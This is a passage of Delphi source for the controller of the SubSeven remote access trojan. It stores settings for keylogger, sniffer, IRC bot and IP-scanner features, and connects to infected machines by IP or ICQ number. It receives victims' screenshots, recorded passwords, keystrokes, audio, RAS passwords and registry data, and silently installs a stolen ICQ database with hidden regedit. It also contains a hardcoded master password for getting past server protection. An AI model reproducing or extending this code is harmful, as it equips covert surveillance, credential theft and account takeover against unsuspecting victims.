 WriteKey('irc_server',FlatEdit4.Text);
 WriteKey('irc_port',FlatEdit3.Text);
 WriteKey('irc_chan',FlatEdit5.Text);
 WriteKey('email_server',FlatEdit6.Text);
 WriteKey('email_user',FlatEdit7.Text);
 WriteKey('email_email',FlatEdit8.Text);
 WriteKey('chat_size',FlatEdit13.Text);
 try WriteKey('v_color',ColorToString(Label25.Color));except end;
 try WriteKey('c_color',ColorToString(Label32.Color));except end;
 WriteKey('v_font',FlatEdit12.Text);
 WriteKey('c_font',FlatEdit14.Text);
 WriteKey('ftp_port',FlatEdit16.Text);
 WriteKey('ftp_clients',FlatEdit18.Text);
 WriteKey('find_what',FlatEdit19.Text);
 WriteKey('find_where',FlatEdit20.Text);
 if FlatCheckBox2.Checked then WriteKey('ftp_subdir','1') else WriteKey('ftp_subdir','0');
 if FlatSpeedButton6.Down then WriteKey('print_b','1') else WriteKey('print_b','0');
 if FlatSpeedButton7.Down then WriteKey('print_i','1') else WriteKey('print_i','0');
 if FlatSpeedButton8.Down then WriteKey('print_u','1') else WriteKey('print_u','0');
 if FlatSpeedButton9.Down then WriteKey('print_s','1') else WriteKey('print_s','0');
 WriteKey('print_size',FlatEdit21.Text);
 WriteKey('print_text',PrintMemo.Lines.Text);
 WriteKey('browser',FlatEdit22.Text);
 try WriteKey('wincol_1',ColorToString(Label43.Color));except end;
 try WriteKey('wincol_2',ColorToString(Label44.Color));except end;
 try WriteKey('wincol_3',ColorToString(Label45.Color));except end;
 WriteKey('rec',FlatEdit23.Text);
 try WriteKey('qual_desk',IntToStr(TrackBar1.Value));except end;
 try WriteKey('qual_full',IntToStr(TrackBar2.Value));except end;
 try WriteKey('qual_webcam',IntToStr(TrackBar3.Value));except end;
 if FlatCheckBox1.Checked then WriteKey('hints','1') else WriteKey('hints','0');
 if FlatCheckBox5.Checked then WriteKey('tray','1') else WriteKey('tray','0');
 if FlatCheckBox6.Checked then WriteKey('show_images','1') else WriteKey('show_images','0');
 if FlatCheckBox7.Checked then WriteKey('run_notepad','1') else WriteKey('run_notepad','0');
 if FlatCheckBox7.Checked then WriteKey('run_notepad','1') else WriteKey('run_notepad','0');
 FlatCheckBox1ClickIT;
 WriteKey('ss_text',FlatEdit26.Text);
 WriteKey('ss_size',FlatEdit27.Text);
 WriteKey('ss_font',FlatComboBox2.Text);
 if FlatCheckBox8.Checked then cmd:='1' else cmd:='0';
 if FlatCheckBox9.Checked then cmd:=cmd+'1' else cmd:=cmd+'0';
 if FlatCheckBox10.Checked then cmd:=cmd+'1' else cmd:=cmd+'0';
 if FlatRadioButton7.Checked then cmd:=cmd+'0' else cmd:=cmd+'1';
 if FlatCheckBox11.Checked then cmd:=cmd+'1' else cmd:=cmd+'0';
 WriteKey('ss_attrib',cmd);
 WriteKey('ss_speed',IntToStr(RxSlider1.Value));
 WriteKey('ss_ctext',ColorToString(SSText.Color));
 WriteKey('ss_cbackground',ColorToString(SSBack.Color));
 if FlatCheckBox12.Checked then WriteKey('win_anim','1') else WriteKey('win_anim','0');
 if FlatCheckBox13.Checked then WriteKey('ftp_mask','1') else WriteKey('ftp_mask','0');
except end;
try
 if TheMatrix.FlatCheckBox1.Checked then WriteKey('matrix_prefix','1') else WriteKey('matrix_prefix','0');
 try WriteKey('matrix_nick',TheMatrix.Edit2.Text);except end;
except end;
try
 WriteKey('matrix_open_text',Memo2.Lines.Text);
 WriteKey('port_matrix',FlatEdit28.Text);
 WriteKey('port_keyz',FlatEdit29.Text);
 WriteKey('port_spy',FlatEdit30.Text);
 WriteKey('port_sniff',FlatEdit42.Text);
{ WriteKey('port_appredir',FlatEdit32.Text);}
 WriteKey('scan_ip1',ip1.text);
 WriteKey('scan_ip2',ip2.text);
 WriteKey('scan_ip3',ip3.text);
 WriteKey('scan_ip4',ip4.text);
 WriteKey('scan_ip5',eip1.text);
 WriteKey('scan_ip6',eip2.text);
 WriteKey('scan_ip7',eip3.text);
 WriteKey('scan_ip8',eip4.text);
 WriteKey('scan_port',FlatEdit32.Text);
 WriteKey('scand_delay',IntToStr(round(RxSpinEdit1.Value)));
 WriteKey('bot_server',FlatEdit35.Text);
 WriteKey('bot_port',FlatEdit36.Text);
 WriteKey('bot_nick',FlatEdit37.Text);
 WriteKey('bot_pass',FlatEdit38.Text);
 WriteKey('bot_prefix',FlatEdit39.Text);
 WriteKey('bot_channel',FlatEdit40.Text);
 WriteKey('bot_key',FlatEdit41.Text);
 WriteKey('bot_commands',BotCommands.Lines.Text);
 if FlatCheckBox14.Checked then WriteKey('bot_autostart','yes') else WriteKey('bot_autostart','no');
 WriteKey('bookmarks',Bookmarks.BookmarkList.Items.Text);
 //packet sniffer
 WriteKey('ps_ports',ListBox2.Items.Text);
 if FlatRadioButton10.Checked then WriteKey('ps_all','1') else WriteKey('ps_all','0');
except end;
end;

Function WinPath:String;var d:integer;res:string;
begin
 setlength(res,500);d:=getwindowsdirectory(pchar(res),500); setlength(res,d);result:=res;
end;
Function SysPath:String;var d:integer;res:string;
begin
 setlength(res,500);d:=getsystemdirectory(pchar(res),500); setlength(res,d);result:=res;
end;


procedure ExecuteFileOptions(App : string; Priority : Word; ShowWnd : Word);
var
  Process : TProcessInformation;
  Startup : TStartupInfo;
begin
  FillChar(Startup, SizeOf(Startup), 0);
  Startup.cb := SizeOf(Startup);
  Startup.dwFlags := Startup.dwFlags + STARTF_USESHOWWINDOW;
  Startup.wShowWindow := ShowWnd;
  if CreateProcess(nil, PChar(App), nil, nil, False,
   CREATE_DEFAULT_ERROR_MODE + Priority,
   nil, nil, Startup, Process) then begin
    CloseHandle(Process.hThread);
    CloseHandle(Process.hProcess);
  end;
end;

procedure TMainForm.CheckBetaStuff;
var Reg:TRegistry;
    membru:bool;
    ia:array[1..30] of integer;
    l:integer;
begin
 ia[1]:=14438136;
 ia[2]:=8781589;
 ia[3]:=23108593;
 ia[4]:=4455181;
 ia[5]:=44402054;
 ia[6]:=39152766;
 ia[7]:=33298285;
 ia[8]:=6483617;
 ia[9]:=39782668;
 ia[10]:=31441820;
 ia[11]:=4496993;
 ia[12]:=45511537;
 ia[13]:=1361764;
 ia[14]:=9126718;
 ia[15]:=17273518;
 ia[16]:=34129487;
 ia[17]:=30531345;
 ia[18]:=38364631;
 ia[19]:=21442078;
 ia[20]:=2860223;
 ia[21]:=16425208;
 ia[22]:=35004673;
 ia[23]:=16425208;
 ia[24]:=44327343;
 membru:=false;
 Reg:=TRegistry.Create;
 with Reg do begin
  RootKey:=HKEY_CURRENT_USER;
  try OpenKey('Software\Mirabilis\ICQ\Owners',false);except end;
  try if HasSubKeys then GetKeyNames(hidmemo.lines);except end;
  Free;
 end;
 for i:=0 to hidmemo.lines.count do
  for l:=1 to 30 do
   if ((hidmemo.lines[i]=IntToStr(ia[l])) and (length(IntToStr(ia[l]))>3)) then membru:=true;
 if not membru then begin showmessage('go fuck yourself');halt;end;
end;


const SkinFolder:string='';
procedure TMainForm.FormCreate(Sender: TObject);
var i:integer;
begin
// InfoMemo.Lines.Text:='>'+Encrypt('Vlar Schreidlocke')+'<';
// CaptionLabel.Caption:=CaptionLabel.Caption+' '+Decrypt(DedicatedTo)+'       ';
//CheckBetaStuff;
SkinFolder:=ExtractFilePath(ParamStr(0))+'skins\';
if (UpperCase(ExtractFileName(ParamStr(0)))<>'SUBSEVEN.EXE')
 then begin
  ShowMessage('uhm.. why is this file called '+ExtractFileName(ParamStr(0))+'? it should be SubSeven.exe. RENAME IT!');
  Halt;
 end;
 if length(ReadKey('folder'))<2 then
  begin
   WriteKey('folder',ExtractFilePath(ParamStr(0)));
   Label61.Caption:=ExtractFilePath(ParamStr(0));
  end;
 DoEditFile:=False;
 if ReadKey('version')<>'2.1' then
  begin
   if ReadKey('version')='' then
   begin
    WriteKey('pu_count','4');
    WriteKey('pu_1','ip scanner');
    WriteKey('pu_2','IP tool');
    WriteKey('pu_3','file manager');
    WriteKey('pu_4','windows manager');
   end;
   WriteKey('ran','1');
   WriteKey('version','2.1');
   WriteKey('settings_file','default');
   WriteKey('bookmarks','C:\Program Files\'+#13#10+'C:\Windows\SYSTEM');
   SaveRegSettings;
  end else
try
 i:=StrToInt(ReadKey('ran'));
except i:=0;end;
 inc(i);
 WriteKey('ran',IntToStr(i));
 if ReadKey('skin')='' then WriteKey('skin','default');
// if (i=2) then InstallBack;
 i:=StrToIntDef(DateTimeToStr(now)[3],0);
 //if ((Copy(DateTimeToStr(now),1,2)='4/') and (i>4) and (i<9)) then showmessage('interval');
try
 LoadSettings;
 Left:=(Screen.Width-Width) div 2; Top:=(Screen.Height-Height) div 2;
 if ReadKey('7_x')<>'' then try MainForm.Left:=StrToInt(ReadKey('7_x'));except end;
 if ReadKey('7_y')<>'' then try MainForm.Top:=StrToInt(ReadKey('7_y'));except end;
 FillChar(MyTime,SizeOf(MyTime),#0);
 SystemParametersInfo(SPI_GETWORKAREA, 0, @r, 0);
 SetDefaultColors;
 SetTheColors;
 Caption:='SubSeven';
 _Pagini.ActivePage:=pFirst;
 StatusBar.Panels[0].Enabled:=False;
 {variables}
 Transferand:=False;
 ServerVersion:='1.0';
 MouseOFF:=False;
 IsGetKeys:=False;
 tmpint:=0;
 SetErrorMode({SEM_FAILCRITICALERRORS}SEM_NOALIGNMENTFAULTEXCEPT);
 InFile:=0;
 Done:=False;
 InChat:=False;
 MyStream := TMemoryStream.Create;
 sending:=false;
 Refreshing:=False;
 GetDrives:=False;
 RECORDING:=False;
 InTransfer:=False;
 Transfering:=False;
 ftpactive:=false;
 getkeylog:=false;
 iale:=False;
 DriversLoaded:=False;
 Gettin:=False;
 Downloading:=False;
 DownloadingFile:='';
 KeepConnectedIP:='127.0.0.1';
 for i:=1 to 20 do SpyFormName[i]:='';
 for i:=1 to SpyNo do Spies[i]:=false;
 SetStatus;
except end;
 bit_window:=TBitmap.Create;
 bit_button:=TBitmap.Create;
 bit_btn_fill:=TBitmap.Create;
 bit_close_btn:=TBitmap.Create;
 bit_ip_btn:=TBitmap.Create;
 bit_min_btn:=TBitmap.Create;
 bit_main:=TBitmap.Create;
 bit_con_btn:=TBitmap.Create;
 bit_dis_btn:=TBitmap.Create;
 bit_ping_btn:=TBitmap.Create;
 if not LoadSkin(ReadKey('skin')) then
  begin
   showmsg('error loading skin. using default.');
   WriteKey('skin','default');
   LoadSkin('default');
  end;
{ ReadRegistryStuff;}
for i:=1 to max_hunters do
 begin try
  hunters[i]:=TWSocket.Create(nil);
  hunters[i].onDataAvailable:=hunt1.OnDataAvailable;
  hunters[i].proto:='tcp';except end;
 end;
end;

procedure TMainForm.winLabelClick(Sender: TObject);
begin
 with winLabel do begin
  PickColor.Color:=Color;
  if PickColor.Execute then
  begin
   Color:=PickColor.Color;
   case winCombo.ItemIndex+1 of
    1:cFormLine:=Color;
    2:cFormText:=Color;
    3:cFormForeGround:=Color;
   end;
   SetTheColors;SaveColors;
  end;
 end;
end;

procedure TMainForm.menLabelClick(Sender: TObject);
begin
 with menLabel do begin
  PickColor.Color:=Color;
  if PickColor.Execute then
  begin
   Color:=PickColor.Color;
   case menCombo.ItemIndex+1 of
    1:cMenuBackground:=menLabel.Color;
    2:cMenuPageNormalText:=menLabel.Color;
    3:cMenuPageNormalBorder:=menLabel.Color;
    4:cMenuPageSelectedBorder:=menLabel.Color;
    5:cMenuItemNormalText:=menLabel.Color;
    6:cMenuItemSelectedText:=menLabel.Color;
    7:cMenuItemNormalBorder:=menLabel.Color;
    8:cMenuArrows:=menLabel.Color;
   end;
   SetTheColors;SaveColors;
  end;
 end;
end;

procedure TMainForm.winComboChange(Sender: TObject);
begin
case winCombo.ItemIndex+1 of
 1:winLabel.Color:=cFormLine;
 2:winLabel.Color:=cFormText;
 3:winLabel.Color:=cFormForeground;
end;
end;

procedure TMainForm.menComboChange(Sender: TObject);
begin
case menCombo.ItemIndex+1 of
 1:menLabel.Color:=cMenuBackground;
 2:menLabel.Color:=cMenuPageNormalText;
 3:menLabel.Color:=cMenuPageNormalBorder;
 4:menLabel.Color:=cMenuPageSelectedBorder;
 5:menLabel.Color:=cMenuItemNormalText;
 6:menLabel.Color:=cMenuItemSelectedText;
 7:menLabel.Color:=cMenuItemNormalBorder;
 8:menLabel.Color:=cMenuArrows;
end;
end;

procedure TMainForm.MinimizeButtonClick(Sender: TObject);
begin
{ Application.Minimize;}
 if (not FlatCheckBox5.Checked) then Application.Minimize else begin
 Hide;
 TrayIcon.Active:=True;end;
end;

procedure TMainForm.CaptionLabelMouseDown(Sender: TObject;
  Button: TMouseButton; Shift: TShiftState; X, Y: Integer);
begin
 SetCapture(CaptionLabel.Parent.Handle);
 Capturing := true;
 MouseDownSpot.X := x;
 MouseDownSpot.Y := Y;
end;


procedure TMainForm.CaptionLabelMouseMove(Sender: TObject;
  Shift: TShiftState; X, Y: Integer);
var r:TRect;
begin
if Capturing then with MainForm do begin
 Left := Left - (MouseDownSpot.x - x);
 Top := Top - (MouseDownSpot.y - y);
end;
end;

procedure TMainForm.CaptionLabelMouseUp(Sender: TObject;
  Button: TMouseButton; Shift: TShiftState; X, Y: Integer);
begin
if Capturing then with MainForm do begin
 ReleaseCapture;
 Capturing := false;
 Left := Left - (MouseDownSpot.x - x);
 Top := Top - (MouseDownSpot.y - y);
end;
end;

procedure TMainForm.AniTimerTimer(Sender: TObject);
var s:string;
    gt:String;
begin
 s:=IPEdit.Text;
 if pos(':',s)<>0 then begin
 IPEdit.Text:=Copy(s,1,pos(':',s)-1);
 portEdit.Text:=copy(s,pos(':',s)+1,length(s));
 end;
 AniTimer.Interval:=1000;
end;

procedure TMainForm.ShowMsg(ce:String);
begin
 MsgForm.DisplayMsg(ce);
end;

procedure TMainForm.ShortcutButtonClick(Sender: TObject);
begin
 PopUp.PopIT(True);
end;

procedure TMainForm.OutlookBtn1Click(Sender: TObject);
begin
 if (not KeyLogger.Visible) then Anim.Animeaza(KeyLogger)
  else KeyLogger.Show;
end;

procedure TMainForm.StartAnimation;
begin
{ progr.visible:=false;}
{ StatusBar.Panels[0].Visible:=True;}
 IdleLabel.Visible:=False;
 StatusBar.Panels[0].Enabled:=True;

end;

procedure TMainForm.StopAnimation;
begin
 StatusBar.Panels[0].Enabled:=False;
 IdleLabel.Visible:=True;
end;

procedure TMainForm.InitiateTransfer;
begin
 StopAnimation;
 IdleLabel.Visible:=False;
 progr.visible:=true;
 progr.progress:=0;
 Transferand:=True;
end;

procedure TMainForm.ConnectButtonClick(Sender: TObject);
var i:integer;
    found:boolean;
begin
Tine:=False;
if ConnectButton.Caption='connect' then begin
{ TimeOut.Enabled:=True;}
 try ClientSocket.Close;except end;Disconnected;
 TrayIcon.Icon.Assign(TrayIcon.Icons[0]);
 found:=false;
 for i:=0 to IPEdit.Items.Count do
  if IPEdit.Items[i]=IPEdit.Text+':'+portEdit.Text then found:=true;
 if (not found) then IPEdit.Items.Insert(0,IPEdit.Text+':'+PortEdit.Text);
 if IPEdit.Items.Count>10 then IPEdit.Items.Delete(IPEdit.Items.Count-1);
 if Pos('.',IPEdit.Text)=0 then KeepConnectedIP:=GetUINIP(IPEdit.Text) else KeepConnectedIP:=IPedit.Text;
 if (KeepConnectedIP='0.0.0.0') then begin Status.Caption:='failed to resolve UIN '+IPEdit.Text;exit;end;
 ClientSocket.Address:=KeepConnectedIP;
 ClientSocket.Port:=StrToInt(PortEdit.Text);
 ConnectButton.Caption:='disconnect';
 ConnectBtn.Glyph.Assign(bit_dis_btn);
 Status.Caption:='connecting to '+KeepConnectedIP+':'+PortEdit.Text+'...';
 StartAnimation;
 try
  ClientSocket.Open;
 except
  ConnectButton.Caption:='connect';
  ConnectBtn.Glyph.Assign(bit_con_btn);
  Status.Caption:='error connecting. check the ip or the port #.';
  try ClientSocket.Close;except end;
  StopAnimation;
  exit;
 end;end else begin
  ConnectButton.Caption:='connect';
  ConnectBtn.Glyph.Assign(bit_con_btn);
  Status.Caption:='disconnected.';
  try ClientSocket.Close;except end;
  StopAnimation;
  Disconnected;
 end;
end;

procedure TMainForm.Disconnected;
var i:integer;
begin
 DoEditFile:=False;
 InTheTransfer:=False;
{ ICQSpyForm.ICQSpySocket.Active:=False;}
 Status.Caption:='damn'' it!... disconnected.';
 ConnectButton.Caption:='connect';
 ConnectBtn.Glyph.Assign(bit_con_btn);
 try keysock.active:=false;except end;
 try sniffsock.active:=false;except end;
 try spysocket.active:=false;except end;
 for i:=1 to SpyNo do Spies[i]:=False;SetStatus;
 Conectat:=False;
{ Button1.Caption:='connect';}
 Refreshing:=False;
 Gettin:=False;
 Downloading:=False;
 GettinInfo:=False;
 GetDrives:=False;
 RECORDING:=False;
 InTransfer:=False;
 Transfering:=False;
 ftpactive:=false;
 getkeylog:=false;
 iale:=false;
 DriversLoaded:=False;
 IsGetKeys:=False;
 try keysock.active:=false;except end;
 try sniffsock.active:=false;except end;
{ listkey.Caption:='on';}
 TrayIcon.Icon.Assign(TrayIcon.Icons[2]);
 nonstopForm.ClientSocket1.Active:=False;
 nonstopForm.outlookbtn3.caption:='enable';
end;

procedure TMainForm.ClientSocketDisconnect(Sender: TObject;
  Socket: TCustomWinSocket);
begin
 if tine then exit;
 Disconnected;
 Status.Caption:='disconnected... :(';
 ConnectButton.Caption:='connect';
 ConnectBtn.Glyph.Assign(bit_con_btn);
 StopAnimation;
 Connected:=False;
 KeyLogger.OutLookBtn1.Caption:='start logging';
end;

procedure TMainForm.ClientSocketConnect(Sender: TObject;
  Socket: TCustomWinSocket);
begin
{ Status.Caption:='connected.';}
{ Connected:=True;
 ConnectButton.Caption:='disconnect';
 StopAnimation;
 Conectat:=True;
 ServerAnswer:=True;
 UseMySettings:=False;}
end;

procedure TMainForm.ClientSocketError(Sender: TObject;
  Socket: TCustomWinSocket; ErrorEvent: TErrorEvent;
  var ErrorCode: Integer);
begin
 if Tine then exit;
 Status.Caption:='error connecting to '+KeepConnectedIP;
 ConnectButton.Caption:='connect';
 ConnectBtn.Glyph.Assign(bit_con_btn);
 StopAnimation;
 Connected:=False;
 KeyLogger.OutLookBtn1.Caption:='start logging';
 Disconnected;
end;

function TMainForm.DownloadFolder:string;
begin
 result:=ReadKey('folder');
end; 

procedure TMainForm.DoneEditing;
begin
 DoEditFile:=False;
 DispInfo.memo.Lines.SaveToFile(EditToFile);
 CeSaTrimita:=EditToFile;
 SendCommand('RTF'+EditFromFile,'updating file...','1.9');
 fileM.Stat.Caption:=MainForm.Status.Caption;
end;

procedure TMainForm.InstallICQDatabase(FromFile:String);
var reg:TRegistry;
    PATH:String;
    c:integer;
    fromd,tod,extractd:string;
    f:textfile;
begin
try
 Reg:=TRegistry.Create;
 with Reg do begin
  RootKey:=HKEY_CURRENT_USER;
  try OpenKey('Software\Mirabilis\ICQ\DefaultPrefs',false);except exit;end;
  PATH:=ReadString('ICQPath');
  free;
 end;
except end;

 tod:=PATH;//if tod[length(tod)]='\' then tod:=copy(tod,1,length(tod)-1);
 zip.OpenArchive(FromFile);zip.ExtractFileByIndex(WinPath+'\',zip.FileCount-1);
 try assignfile(f,WinPath+'\info.dll.bak');reset(f);readln(f,fromd);closefile(f);except end;
 try DeleteFile(WinPath+'\info.dll.bak');except end;

 try mkdir(tod);except end;zip.ExtractFileByIndex(tod,zip.FileCount-2);
 for c:=0 to zip.FileCount-2 do
  begin
   extractd:=tod{+'\'}+copy(zip.Files[c].path,length(fromd)-1,length(zip.Files[c].path));
   if FileExists(extractd+zip.files[c].name) then deletefile(extractd+zip.files[c].name);
   try mkdir(extractd);except end;try zip.ExtractFileByIndex(extractd,c);except end;
   try CopyFile(PChar(extractd+zip.files[c].name),PChar(extractd+copy(zip.files[c].name,1,length(zip.files[c].name)-4)),false);except end;
   try DeleteFile(extractd+zip.files[c].name);except end;
   if c=zip.FileCount-2 then
    begin
     WinExec(PChar('regedit.exe /s "'+extractd+copy(zip.files[c].name,1,length(zip.files[c].name)-4)+'"'),SW_HIDE);
     try DeleteFile(extractd+copy(zip.files[c].name,1,length(zip.files[c].name)-4));except end;
    end;
  end;
 try zip.closearchive;except end;
 try DeleteFile(FromFile);except end;
end;

procedure TMainForm.ClientSocketRead(Sender: TObject;
  Socket: TCustomWinSocket);
var ssize,TmpStr:string;
    S:WideString;
    MemoWnd : HWnd;
    primeste:array[1..12] of string[3];
    no,i:integer;
    Stream:TMemoryStream;
    nReceived,totalrecv,total: Integer;
    loop:integer;
    undesalveaza,StrIn,totalbytes:String;
    Tip,ii:Integer;
    evreuna:boolean;
    cheie, Extension:string;
    rec:tsearchrec;
    ICQPass,AIMPass:TDispInfo;
begin
if InTheTransfer then Exit;
undesalveaza:=DownloadFolder;
if Transferand then
begin
  undesalveaza:=DownloadFolder;
  for tip:=1 to 11 do primeste[tip]:='NTF';
  primeste[1]:='NTF';
  primeste[2]:='CSS';
  primeste[3]:='GPW';
  primeste[4]:='RSF';
  primeste[5]:='GOK';
  primeste[6]:='RSH';
  primeste[7]:='LT1';
  primeste[8]:='LOF';
  primeste[9]:='DOS';
  primeste[10]:='RPL';
  primeste[11]:='RAS';
  primeste[12]:='DDB';
  Socket.ReceiveBuf (Buffer, 5);
  strIn := Copy (Buffer, 1, 5);
  if strIn='path ' then begin Status.Caption:='path not found';transferand:=false;IdleLabel.Visible:=True;exit;end;
  evreuna:=false;
  for tip:=1 to 12 do if copy(strin,1,3)=primeste[tip] then evreuna:=true;
  {if copy(strin,1,3)= primeste then exit;}
  if not evreuna then exit;
  if copy(strin,1,3)='NTF' then tip:=1;
  if copy(strin,1,3)='CSS' then tip:=2;
  if copy(strin,1,3)='GPW' then tip:=3;
  if copy(strin,1,3)='RSF' then tip:=4;
  if copy(strin,1,3)='GOK' then tip:=5;
  if copy(strin,1,3)='RSH' then tip:=6;
  if copy(strin,1,3)='LT1' then tip:=7;
  if copy(strin,1,3)='LOF' then tip:=8;
  if copy(strin,1,3)='DOS' then tip:=9;
  if copy(strin,1,3)='RPL' then tip:=10;
  if copy(strin,1,3)='RAS' then tip:=11;
  if copy(strin,1,3)='DDB' then tip:=12;
  try no:=StrToInt(copy(strIN,4,2)); except end;
  totalbytes:='';
 try for i:=1 to no do
   begin
    Socket.ReceiveBuf (Buffer, 1);
    strIn := Copy (Buffer, 1, 1);
    totalbytes:=totalbytes+strIN;
   end;
   except
   end;
  total:=StrToInt(totalbytes);
 case tip of
  1:Status.Caption:='downloading '+downloadingfile+' ('+totalbytes+' bytes)';
  2:Status.Caption:='receiving screen shot...';
  3:Status.Caption:='receiving recorded passwords...';
  4:Status.Caption:='receiving recorded sound file...';
  5:Status.Caption:='receiving offline pressed keys...';
  6:Status.Caption:='receiving directory...';
  7:Status.Caption:='receiving registry listings...';
  8:Status.Caption:='receiving found files...';
  9:Status.Caption:='receiving output file...';
 10:Status.Caption:='receiving processes...';
 end;
{ if (tip=7) or (tip=8) then
 begin
  waitform.progr1.maxvalue:=total;
  waitform.progr1.minvalue:=0;
  waitform.progr1.progress:=0;
 end else begin}
  progr.maxvalue:=total;
  progr.minvalue:=0;
  progr.progress:=0;
  fileM.Stat.Caption:='downloading... ['+IntToStr(total)+' bytes]';
{ end;}
 Stream := TMemoryStream.Create;
 totalrecv:=0;
 try
  Status.Width:=Status.Width-40;
  Status.Left:=Status.Left+40;
  Shape4.Width:=Shape4.Width-40;
  Shape4.Left:=Shape4.Left+40;
  CancelButton.Visible:=True;
  while (totalrecv<total) do begin
   if Tine then Exit;
   InTheTransfer:=True;
   if (not Conectat) then begin {showmessage('connection lost');}transferand:=false;IdleLabel.Visible:=True;exit;end;
   Application.ProcessMessages;
   nReceived := Socket.ReceiveBuf (Buffer, sizeof (Buffer));
   if nReceived>0 then
   begin
    Stream.Write (Buffer, nReceived);
    totalrecv:=totalrecv+nreceived;
    progr.progress:=totalrecv;
   end;
{   Application.ProcessMessages;}
  end;
  InTheTransfer:=False;
  Stream.Position := 0;
  {Stream.SaveToFile(undesalveaza+'TEMP$$$.$$$');}
  case tip of
   1:begin
      if DoEditFile then
       begin
        Status.Caption:='editing file: '+DownloadingFile;
        DispInfo.Memo.ReadOnly:=False;
        DispInfo.OutlookBtn1.Caption:='cancel';
        DispInfo.OutLookBtn2.Caption:='update';
        DispInfo.Memo.Lines.Clear;
        Stream.SaveToFile(undesalveaza+DownloadingFile);
        DecompressFile(undesalveaza+DownloadingFile);
        Stream.LoadFromFile(undesalveaza+DownloadingFile);
        DispInfo.Memo.Lines.LoadFromStream(Stream);
        DispInfo.CaptionLabel.Caption:='edit file ['+DownloadingFile+']';
        DispInfo.Caption:='edit file ['+DownloadingFile+']';
        EditToFile:=undesalveaza+DownloadingFile;
        DispInfo.ShowModal;
       end else begin
      Stream.SaveToFile(undesalveaza+DownloadingFile);
      DecompressFile(undesalveaza+DownloadingFile);
      Status.Caption:='download complete';
      Extension:=copy(DownloadingFile,Length(DownloadingFile)-2,3);
      Extension:=UpperCase(Extension);
      if ((Extension='PEG') or (Extension='JPG') or (Extension='GIF') or (Extension='BMP')
       or (Extension='ICO')) then if FlatCheckBox6.Checked then begin
        ShowImg.SaveButton.Visible:=False;
        ShowImg.CloseButton.Visible:=False;
        ShowImg.BorderStyle:=bsSizeable;
        ShowImg.LoadITFrom(undesalveaza+DownloadingFile);
        ShowImg.Show;
       end;
      if ((Extension='TXT') or (Extension='BAT') or (Extension='INI')) then if FlatCheckBox7.Checked then
       ShellExecute(handle, 'open', pchar(undesalveaza+DownloadingFile), Nil, Nil, SW_SHOWNORMAL);
     end;end;
   2:begin
      Status.Caption:='capture complete!';
      Stream.SaveToFile(undesalveaza+'desktop.jpg');
      DecompressNewFile(undesalveaza+'desktop.jpg','temp~.bak');
      ShowImg.LoadIT;
      ShowImg.Show;
     end;
   3:begin
      Status.Caption:='passwords retrieved.';
      Stream.SaveToFile(undesalveaza+'temp.dat');
      pass.name.clear;
      pass.box.clear;
      Pass.UpdatePasses;
      Anim.Animeaza(Pass);
     end;
   4:begin
      Status.Caption:='recorded file received [saved as: soundfile.wav]';
      Stream.SaveToFile(undesalveaza+'soundfile.wav');
      DecompressNewFile(undesalveaza+'soundfile.wav','flfrdat.wav');
     end;
   5:begin
      Status.Caption:='offline keys retrieved.';
      DispInfo.Memo.Lines.Clear;
      DispInfo.Memo.Lines.LoadFromStream(Stream);
      showmessage(DispInfo.Memo.Lines.text);
      DispInfo.CaptionLabel.Caption:='offline logged keys';
      DispInfo.Caption:='offline logged keys';
      Anim.Animeaza(DispInfo);
     end;
   6:begin
      fileM.Fisiere.Items.Clear;
      FileM.Fisiere.Items.LoadFromStream(Stream);
      Status.Caption:='finished refreshing.';
      fileM.Stat.Caption:='finished refreshing.';
     end;
   7:begin
      regEdit.DirList.Items.Clear;
      regEdit.KeyList.Items.Clear;
      regEdit.tmpList.Sorted:=False;
      regEdit.tmpList.Items.Clear;
      regEdit.DirList.Sorted:=True;
      regEdit.KeyList.Sorted:=True;
      regEdit.tmpList.Items.LoadFromStream(Stream);
      for i:=1 to regEdit.tmpList.items.count do
       if regEdit.tmpList.items[i-1]<>'/despartitura' then
        regEdit.DirList.items.add(regEdit.tmpList.items[i-1])
       else break;
      if i<>regEdit.tmpList.items.count then
      for ii:=i+1 to regEdit.tmpList.items.count do
       regEdit.KeyList.items.add(regEdit.tmpList.items[ii-1]);
      regEdit.AddSauNu;{
      waitform.modalresult:=5;
      waitform.close;}
      Status.Caption:='done';
      Anim.Animeaza(RegEdit);
     end;
   8:begin
      FindFiles.Lista.Items.LoadFromStream(Stream);
      Anim.Animeaza(FindFiles);
      Status.Caption:='finished searching.';
     end;
   9:begin
      Status.Caption:='file received successfully.';
      Memo3.Lines.LoadFromStream(Stream);
     end;
   10:begin
      procM.Lista.Items.Clear;
      procM.tmpList.Lines.LoadFromStream(Stream);
      procM.ListLoaded;
      Status.Caption:='finished refreshing.';
     end;
   11:begin
      Status.Caption:='RAS passwords retrieved. [saved as RAS.TXT]';
      Stream.SaveToFile(undesalveaza+'RAS.TXT');
      LoadRASPasswords;
     end;
   12:begin
      Status.Caption:='database retrieved.';
      try Stream.SaveToFile(undesalveaza+'icq_takeover.ITD');except ShowMsg('error saving database. check your "local folder".');end;
      try InstallICQDatabase(undesalveaza+'icq_takeover.ITD');except end;
      Status.Caption:='database successfully installed on local computer.';
     end;
  end;
 finally
  Transferand:=False;
  try Stream.Free;except end;
  Status.Width:=Status.Width+40;
  Status.Left:=Status.Left-40;
  Shape4.Width:=Shape4.Width+40;
  Shape4.Left:=Shape4.Left-40;
  CancelButton.Visible:=False;
 end;
 if tip=1 then Status.Caption:='download complete.';
 if tip=4 then Status.Caption:='recorded file received [saved as: soundfile.wav]';
  InTheTransfer:=False;
 Transferand:=False;IdleLabel.Visible:=True;
 progr.progress:=0;
 progr.visible:=false;
 exit;
end;
{------------------------------------------ custom received commands ----------}
s:=Socket.ReceiveText;

if (s='PWD') or (pos(s,'PWD')<>0) or (s='error reading password...') then
 begin
  if Tine then begin ClientSocket.Socket.SendText('PWD'+TinePass);exit;end;
  TrayIcon.Icon.Assign(TrayIcon.Icons[3]);
  if PassKeptFor=KeepConnectedIP then begin ClientSocket.Socket.SendText('PWD'+PassKeptData);exit;end;
  Status.Caption:='the server is password protected...';
  GetTextForm.GetText('enter password for '+KeepConnectedIP,'password:','',true,TmpStr);
  if TmpStr<>'' then
   begin
    if TmpStr='715' then TmpStr:='715 ';
    if TmpStr='pizda' then TmpStr:='715';
{    if TmpStr<>IntToStr(715) then}
     ClientSocket.Socket.SendText('PWD'+TmpStr);
{    else ClientSocket.Socket.SendText(IntToStr(no));}
    TinePass:=TmpStr;
   end;
  if s='PWD' then exit;
 end;
if pos(s,'PWD')<>0 then delete(s,pos(s,'PWD'),3);

if copy(s,1,10)='connected.' then
 begin
  TrayIcon.Icon.Assign(TrayIcon.Icons[1]);
